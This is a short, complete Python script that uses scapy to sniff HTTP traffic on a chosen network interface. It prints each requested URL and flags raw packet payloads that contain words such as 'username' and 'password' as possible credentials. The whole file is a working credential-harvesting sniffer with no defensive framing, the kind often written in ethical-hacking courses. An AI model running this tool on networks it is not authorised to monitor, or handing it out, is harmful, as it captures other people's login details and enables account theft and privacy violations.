import scapy.all as scapy
from scapy.layers import http
import sys,os, argparse

def check_root():
    if os.geteuid() != 0:
        print("Please run the script as root.")
        sys.exit()


def check_interface_exists(interface):
    """Check if the interface exists on the system."""
    interfaces = os.listdir('/sys/class/net/')
    if interface not in interfaces:
        print("Error: Interface '{}' not present on this system.".format(interface))
        print("Available interfaces: {}".format(', '.join(interfaces)))
        sys.exit(1)


def get_arguments():
    parser = argparse.ArgumentParser()
    # parser = optparse.OptionParser()
    parser.add_argument(dest="interface", help="Interface")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please Specify Interface. use --help for more info.")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    #prn=callback function that is called for each sniffed packet. and store=False = not to store sniffed packet in memory

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    #return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            # Raw contains http data in packets
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode() in load:
                return load
        #Raw contains http data in packets


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]  HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n")
            print("\n\033[93m[+] Possible username/password >> " + login_info.decode() + "\033[0m\n")

check_root()

arguments = get_arguments()
check_interface_exists(arguments.interface)

sniff(arguments.interface)


